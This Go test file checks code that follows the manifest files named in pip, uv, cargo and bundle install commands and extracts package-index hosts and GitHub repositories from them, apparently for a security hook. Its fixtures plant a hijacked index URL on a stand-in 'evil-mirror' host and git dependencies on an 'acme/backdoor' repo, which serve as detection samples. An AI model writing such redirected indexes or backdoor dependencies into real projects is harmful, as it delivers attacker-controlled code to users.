package extract

import (
	"os"
	"path/filepath"
	"testing"
)

// writeFile creates a file under dir and returns its base name, for
// building the `cwd`-relative commands these tests exercise.
func writeFile(t *testing.T, dir, name, content string) string {
	t.Helper()
	full := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return name
}

// TestManifestFollowPaths covers argv parsing in isolation: which flags are
// recognized, both value forms, and the cases that must yield nothing.
func TestManifestFollowPaths(t *testing.T) {
	for _, tc := range []struct {
		name string
		cmd  string
		want []string
	}{
		{"pip -r", "pip install -r requirements.txt", []string{"requirements.txt"}},
		{"arbitrary filename", "pip install -r myrequirements.txt", []string{"myrequirements.txt"}},
		{"nested path", "pip install -r reqs/prod.txt", []string{"reqs/prod.txt"}},
		{"long form spaced", "pip install --requirement dev.txt", []string{"dev.txt"}},
		{"long form equals", "pip install --requirement=dev.txt", []string{"dev.txt"}},
		{"constraints", "pip install -c constraints.txt pkg", []string{"constraints.txt"}},
		{"multiple", "pip install -r a.txt -r b.txt", []string{"a.txt", "b.txt"}},
		{"pip3", "pip3 install -r a.txt", []string{"a.txt"}},
		{"uv", "uv pip install -r a.txt", []string{"a.txt"}},
		{"python -m pip", "python3 -m pip install -r a.txt", []string{"a.txt"}},
		{"absolute path binary", "/usr/local/bin/pip install -r a.txt", []string{"a.txt"}},
		{"cargo", "cargo build --manifest-path crates/x/Cargo.toml", []string{"crates/x/Cargo.toml"}},
		{"bundle", "bundle install --gemfile=custom.gemfile", []string{"custom.gemfile"}},

		// Nothing to follow.
		{"no manifest flag", "pip install requests", nil},
		{"unknown tool", "npm install -r a.txt", nil},
		{"flag with no value", "pip install -r", nil},
		{"flag followed by another flag", "pip install -r --upgrade", nil},
		{"empty equals value", "pip install --requirement=", nil},
		{"empty command", "", nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := manifestFollowPaths(tokenize(tc.cmd))
			if len(got) != len(tc.want) {
				t.Fatalf("manifestFollowPaths(%q) = %v, want %v", tc.cmd, got, tc.want)
			}
			for i := range tc.want {
				if got[i] != tc.want[i] {
					t.Errorf("path %d = %q, want %q", i, got[i], tc.want[i])
				}
			}
		})
	}
}

// TestFromShellInDir_FollowsRequirementsHosts is the host half: a hijacked
// index URL inside a requirements file, reachable only by following the
// file the install command names.
func TestFromShellInDir_FollowsRequirementsHosts(t *testing.T) {
	dir := t.TempDir()
	name := writeFile(t, dir, "myrequirements.txt",
		"--index-url https://evil-mirror.example/simple\nrequests==2.31.0\n")

	got := FromShellInDir("pip install -r "+name, dir)
	if !containsStr(got, "evil-mirror.example") {
		t.Errorf("expected the index host from the followed manifest, got %v", got)
	}
}

// TestGitHubFromShellInDir_FollowsManifests is the reason this exists: a
// dependency pointed straight at a repository is invisible in argv (the
// command names only the file) and, since dependency files are excluded
// from read-time repository extraction, the install command is the only
// place it can be caught.
func TestGitHubFromShellInDir_FollowsManifests(t *testing.T) {
	t.Run("requirements file", func(t *testing.T) {
		dir := t.TempDir()
		name := writeFile(t, dir, "myrequirements.txt",
			"requests==2.31.0\ngit+https://github.com/Acme/Backdoor@main#egg=thing\n")

		got := GitHubFromShellInDir("pip install -r "+name, dir)
		if len(got.Repos) != 1 || got.Repos[0] != "acme/backdoor" {
			t.Errorf("Repos = %v, want [acme/backdoor]", got.Repos)
		}
	})

	t.Run("cargo manifest", func(t *testing.T) {
		dir := t.TempDir()
		name := writeFile(t, dir, "Cargo.toml",
			"[dependencies]\nthing = { git = \"https://github.com/acme/backdoor\" }\n")

		got := GitHubFromShellInDir("cargo build --manifest-path "+name, dir)
		if len(got.Repos) != 1 || got.Repos[0] != "acme/backdoor" {
			t.Errorf("Repos = %v, want [acme/backdoor]", got.Repos)
		}
	})

	t.Run("clean manifest yields nothing", func(t *testing.T) {
		dir := t.TempDir()
		name := writeFile(t, dir, "requirements.txt", "requests==2.31.0\nflask>=3\n")
		if got := GitHubFromShellInDir("pip install -r "+name, dir); !got.IsEmpty() {
			t.Errorf("a registry-only manifest must yield nothing, got %+v", got)
		}
	})
}

// TestManifestFollow_EnforcesDepthCap pins the one-level bound: a
// requirements file may itself contain `-r nested.txt`, and following that
// chain is exactly the unbounded work the cap exists to prevent. Each
// install command that actually runs gets its own hook event.
func TestManifestFollow_EnforcesDepthCap(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "nested.txt", "git+https://github.com/acme/deep@main\n")
	outer := writeFile(t, dir, "outer.txt", "-r nested.txt\n")

	got := GitHubFromShellInDir("pip install -r "+outer, dir)
	if !got.IsEmpty() {
		t.Errorf("nested requirement files must not be chased, got %+v", got)
	}
}

// TestManifestFollow_ReadFailuresAreSilent: a manifest path that cannot be
// followed must never derail extraction of the command itself. A
// fail-closed hook that errored here would turn a typo into a hard block.
func TestManifestFollow_ReadFailuresAreSilent(t *testing.T) {
	dir := t.TempDir()

	if got := GitHubFromShellInDir("pip install -r does-not-exist.txt", dir); !got.IsEmpty() {
		t.Errorf("missing file: expected empty, got %+v", got)
	}

	// A directory is not a regular file — the same guard script-following
	// applies.
	if err := os.Mkdir(filepath.Join(dir, "adir"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got := GitHubFromShellInDir("pip install -r adir", dir); !got.IsEmpty() {
		t.Errorf("directory: expected empty, got %+v", got)
	}

	// The command's own references still extract even when the manifest
	// cannot be read.
	got := GitHubFromShellInDir("pip install -r gone.txt git+https://github.com/acme/backdoor", dir)
	if len(got.Repos) != 1 || got.Repos[0] != "acme/backdoor" {
		t.Errorf("command-line reference must survive a failed follow, got %+v", got)
	}
}

// TestManifestFollow_OversizeIsSkipped confirms the size cap applies to
// manifests too — a pathological file must not eat the hook budget.
func TestManifestFollow_OversizeIsSkipped(t *testing.T) {
	dir := t.TempDir()
	big := make([]byte, maxScriptBytes+1)
	for i := range big {
		big[i] = 'x'
	}
	copy(big, []byte("git+https://github.com/acme/backdoor@main\n"))
	name := writeFile(t, dir, "huge.txt", string(big))

	if got := GitHubFromShellInDir("pip install -r "+name, dir); !got.IsEmpty() {
		t.Errorf("oversize manifest must be skipped, got %+v", got)
	}
}

func containsStr(list []string, want string) bool {
	for _, v := range list {
		if v == want {
			return true
		}
	}
	return false
}
